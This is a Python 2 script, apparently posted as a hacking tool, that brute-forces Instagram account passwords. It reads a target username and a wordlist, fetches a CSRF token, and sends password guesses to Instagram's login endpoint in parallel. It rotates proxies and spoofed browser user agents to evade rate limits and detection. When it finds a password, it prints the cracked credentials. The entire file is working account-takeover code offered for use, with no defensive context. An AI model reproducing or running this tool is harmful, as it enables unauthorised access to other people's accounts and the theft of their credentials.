###############################################################################
# Instagram Brute forcer
# Developed By N3TC@T
# netcat[dot]av[at]gmail[dot]com 
# !/usr/bin/python
###############################################################################

import sys
import requests
import urllib
import httplib
import random
import multiprocessing
import time

if len(sys.argv) != 5:
        print "\nUsage : ./instabrute.py <username> <wordlist> <proxylist> <thread>"
        print "Eg: ./instabrute.py netcat words.txt proxy.txt 4\n"
        sys.exit(1)

URL = "https://instagram.com/accounts/login/ajax/"
USER = sys.argv[1]
PROXY = sys.argv[3]
THREAD = int(sys.argv[4])


ouruseragent    = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
                'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
                'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
                'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
                'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
                'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
                'Microsoft Internet Explorer/4.0b1 (Windows 95)',
                'Opera/8.00 (Windows NT 5.1; U; en)',
                'amaya/9.51 libwww/5.4.0',
                'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
                'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
                'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
                'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]'
                ]


try:
        words = open(sys.argv[2], "r").readlines()
        
except(IOError):
        print "[-] Error: Check your wordlist path\n"
        sys.exit(1)

try:
        proxys = open(sys.argv[3], "r").readlines()
        
except(IOError):
        print "[-] Error: Check your proxylist path\n"
        sys.exit(1)



print "\n***************************************"
print "* Priv8 Inastgarm Brute forcer        *"
print "* Coded by N3TC@T                     *"
print "* netcat[dot]av[at]gmail[dot]com      *"
print "***************************************"
print "[+] Username Loaded:",USER
print "[+] Words Loaded:",len(words)
print "[+] Proxy Loaded:",len(proxys)


#check proxy list

print "\n[+] Testing Proxy List..."
working_list = []
for prox in proxys:
  prox = prox.replace("\r","").replace("\n","")
  try:
    r=requests.get("http://api.ipify.org/", proxies={'http':'http://'+prox} , timeout=5);
    if (r.status_code == 200 ):
      prox_ip , sp, port = prox.rpartition(':')
      if (prox_ip == r.text):
        working_list.append(prox)
  except requests.exceptions.RequestException :
    pass



print "[+] Online Proxy: " , len(working_list)

def get_csrf():
  global csrf_token
  url = 'https://instagram.com/accounts/login/'
  r = requests.get(url)
  csrf_token = r.cookies['csrftoken']

print "[+] Getting CSRF Token: "
get_csrf()
print "[+] CSRF Token :" , csrf_token , "\n"



def brute(word,event):
  try:  
    proxi = 'No Proxy'  
    if (len(working_list) != 0):
      proxi = random.choice(working_list)
      proxies={'https':'https://'+proxi+'/'}

    word = word.replace("\r","").replace("\n","")
    post_data = {
            'username':USER,
            'password':word,
             }
	     
    header = {
            "User-Agent": random.choice(ouruseragent) ,
            "X-Instagram-AJAX" : "1" ,
            "X-CSRFToken": csrf_token ,
            "X-Requested-With": "XMLHttpRequest" ,
	    "Referer" : "https://instagram.com/accounts/login/ajax/?targetOrigin=https%3A%2F%2Finstagram.com",
            }
    cookies= {
            "csrftoken": csrf_token
             }
    
    print "[*] Trying " , word , " | " ,  proxi
    
    if(proxi != 'No Proxy'):    
      r=requests.post(URL, headers=header ,  data=post_data , cookies=cookies , proxies=proxies , timeout=10)
    else:
      r=requests.post(URL ,headers=header, data=post_data , cookies=cookies ,timeout=10)
    if (r.status_code != 200 ):
      print "Error" , r.status_code
      #sys.exit(1)
    if (r.text.find('{"status":"ok","authenticated":true}') != -1 ):
      print "\n[*]Successful Login:"
      print "---------------------------------------------------"
      print "[!]Username: " , USER
      print "[!]Password: " , word
      print "---------------------------------------------------\n"
      print "[-] Brute Complete\n"
      event.set()
      sys.exit()
  except requests.exceptions.Timeout :
    print "[!] Time Out ..."
    pass
    return


def starter():
  print "\n[!] Initializing Workers"
  print "[!] Start Cracking ... \n"
  p=multiprocessing.Pool(THREAD)
  m = multiprocessing.Manager()
  event = m.Event()

  for word in words:
    p.apply_async(brute , (word,event) )
   

  event.wait()
  sys.exit()

  try:
    time.sleep(1)

  except  (KeyboardInterrupt , SystemExit) :
    print "Caught KeyboardInterrupt, terminating workers"
    p.terminate()
    p.join()
  except :
    pass
  else:
    p.close()
    p.join()


if __name__ == "__main__":
  starter()
